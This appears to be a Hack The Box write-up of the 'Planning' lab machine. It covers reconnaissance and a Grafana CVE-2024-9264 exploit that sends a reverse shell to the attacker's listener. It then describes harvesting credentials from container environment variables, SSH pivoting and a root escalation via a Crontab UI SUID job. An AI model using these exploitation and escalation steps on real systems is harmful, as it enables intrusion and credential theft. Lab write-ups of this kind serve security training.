---
title: "Planning - HTB"
date: "2025-09-26"
views: 0

---
![Pawned](/images/HTB/Pasted_image_20250926073003.png)
Planning is an easy difficulty Linux machine that contains an interesting subdomain: `grafana.planning.htb`, where a Grafana instance is exposed. Using the provided credentials I logged in and, after identifying the vulnerable version, I exploited a remote code execution vector (CVE) that allowed me to run arbitrary commands. With that access I obtained an initial shell in a container and, during local enumeration, I found environment variables that contained useful credentials to connect via SSH as the user *enzo*. Finally, I abused the *Crontab UI* service, which was running with root privileges, and completed a vertical escalation to root, gaining full control of the system.

**Concepts worked on** 
- Web and port enumeration
- Virtual host and subdomains
- Vulnerability research and exploitation (RCE)
- Environment variable inheritance
- SSH pivot
- Manual enumeration
- Abuse of cronjobs via web interface (CronTab UI)
- Abuse of the SUID bit on /bin/bash to escalate privileges
---------
## Reconnaissance

Before starting with active reconnaissance, I create a directory structure to keep the files and results organized.
```zsh
mkdir -p Planning/{scanning,exploits,data/credentials}
```

Then I perform a *ping* to the machine's IP to confirm that there is connectivity.
```zsh
ping -c 1 10.10.11.68
PING 10.10.11.68 (10.10.11.68) 56(84) bytes of data.
64 bytes from 10.10.11.68: icmp_seq=1 ttl=63 time=234 ms

--- 10.10.11.68 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 233.707/233.707/233.707/0.000 ms
```
A *TTL* value of 63 suggests that the remote system is likely running Linux, as *Linux* systems typically use an initial TTL of 64. The observed value being one less indicates that the packet has passed through a single network hop (such as a router or intermediary device), which is common in virtualized environments or when connecting via VPN.

I perform a scan with *Nmap* to see which ports are open.
```zsh
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.68 -oN firstScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 13:38 -05
Nmap scan report for 10.10.11.68
Host is up (0.87s latency).
Not shown: 43146 closed tcp ports (reset), 22387 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.77 seconds
```
- `-p-`: scans the entire range of TCP ports (from 1 to 65535). 
- `–-open`: reports only the open ports, omitting the filtered or closed ones.
- `-sS`: Performs a stealthy SYN scan.
- `–-min-rate 5000`: Sets a minimum rate of 5000 packets per second, speeding up the scan.
- `-n`: To avoid DNS resolution. It prevents wasting time querying hostnames.
- `-Pn`: Skips the ping check. Assumes the host is up.
- `-oN`: Saves the scan output in normal format.

I perform a more thorough scan on the open ports.
```zsh
nmap -p22,80 -sCV 10.10.11.68 -oN targets
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 14:21 -05
Nmap scan report for 10.10.11.68 (10.10.11.68)
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds
```
- `-p22,80`: specifies the ports to scan. 
- `-sC`: runs Nmap's default scripts.
- `-sV`: performs version detection on the discovered services.
- `-oN`: saves the results in a readable format.

I see that the web server performs a redirection to a domain name, `planning.htb`, which suggests that the server is using *Name-Based Virtual Hosting*. Therefore, I proceed to edit the `/etc/hosts` and associate this domain with the victim machine's IP.
```zsh
sed -i '$ a\10.10.11.68\tplanning.htb' /etc/hosts
```

I see what technologies are running in the background.
```zsh
whatweb http://planning.htb
http://planning.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]
```

After analyzing the website and not finding anything noteworthy, I decided to move on and perform a vhost scan.
```zsh
ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://planning.htb/ -H 'Host: FUZZ.planning.htb' -t 50 -ac -fc 400

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/combined_subdomains.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 400
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 259ms]
```

The scan was successful; it allowed me to discover a Grafana service.

I add the new route to `/etc/hosts`.
```zsh
sed -i '$ a\10.10.11.68\tplanning.htb\tgrafana.planning.htb' /etc/hosts
```

I log in with the provided credentials.
![web](/images/HTB/Pasted_image_20250923111457.png)

As you know, whenever there’s a service running in the background, it’s a good practice to check its version and see if it has any CVEs.

```zsh
whatweb http://grafana.planning.htb/login
http://grafana.planning.htb/login [200 OK] Country[RESERVED][ZZ], Grafana[11.0.0], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], Script[text/javascript], Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.24.0]
```
Grafana v11.0.0
## Exploitation

I investigate whether there is any public exploit for that Grafana version.
![research](/images/HTB/Pasted_image_20250925160808.png)

The following GitHub repository contains a fairly intuitive PoC: [CVE-2024-9264 PoC](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit.git)
![research](/images/HTB/Pasted_image_20250925160857.png)

Once the repository is cloned, I go into the directory that contains the exploit to run it. By the way, before launching the exploit remember to set up a listener (in my case: `nc -nlvp 443`).

```zsh
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.16.3 --reverse-port 443 
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 443
```

## User Access

Once I obtained the reverse shell, from the hostname and the fact that I have direct root access, I can infer that I'm inside a container; therefore I'll have to find an escape vector.
```zsh
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.68] 45358
sh: 0: can't access tty; job control turned off
# whoami
root
# hostname 
7ce659d667d7
```

Having root access, I proceed to list the environment variables usually used to configure applications.
```zsh {14-15}
root@7ce659d667d7:~# env
SHELL=bash
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm
AWS_AUTH_EXTERNAL_ID=
SHLVL=3
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```

I find some credentials in the environment variables, so I decide to test whether they are valid by accessing via SSH.
```zsh
ssh enzo@10.10.11.68     
The authenticity of host '10.10.11.68 (10.10.11.68)' can't be established.
ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.68' (ED25519) to the list of known hosts.
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Sep 25 09:29:35 PM UTC 2025

  System load:  0.0               Processes:             223
  Usage of /:   65.4% of 6.30GB   Users logged in:       0
  Memory usage: 40%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Thu Sep 25 21:29:36 2025 from 10.10.16.3
enzo@planning:~$
```

I obtain the flag.
```zsh
enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt 
983d0ecec255f317d3ae5822167428f5
```

## Privilege Escalation

After exploring the file system, I found the file `contra.db` in `/opt/crontabs`. I see that the Docker image `root_grafana` is being saved as root and that the password `P4ssw0rdS0pRi0T3c` is displayed in the command. I now have new credentials that may be useful later on.
```zsh
enzo@planning:/opt/crontabs$ ls
crontab.db
enzo@planning:/opt/crontabs$ cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

I list all connections and listening ports.
```zsh
enzo@planning:~$ netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                         
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43447         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           - 
```
The port 8000 catches my attention, as it is commonly used as an alternative HTTP port. Some firewalls use it for web-based HTTP administration. All of this indicates that there is a high probability of an interface or API running there.

I set up an SSH tunnel (port forwarding) that exposes the service listening on the victim's port 8000 to my localhost:8000, allowing me to access it from my machine.
```zsh
ssh enzo@planning.htb -L 8000:127.0.0.1:8000
```

Then, from the browser, I access the service exposed on that port and use the credentials found in `crontab.db` to log in.
![web](/images/HTB/Pasted_image_20250926071649.png)

![web](/images/HTB/Pasted_image_20250926071722.png)

Before giving it SUID permission.
```zsh
enzo@planning:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Since these jobs run as root, I created a job that copied the bash binary and set the SUID bit on the copy, so that when executed the spawned shell would inherit root privileges.
![web](/images/HTB/Pasted_image_20250926072508.png)

After giving it SUID permission.
```zsh
enzo@planning:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Salsa!
```zsh
enzo@planning:~$ bash -p
bash-5.2# whoami
root
```

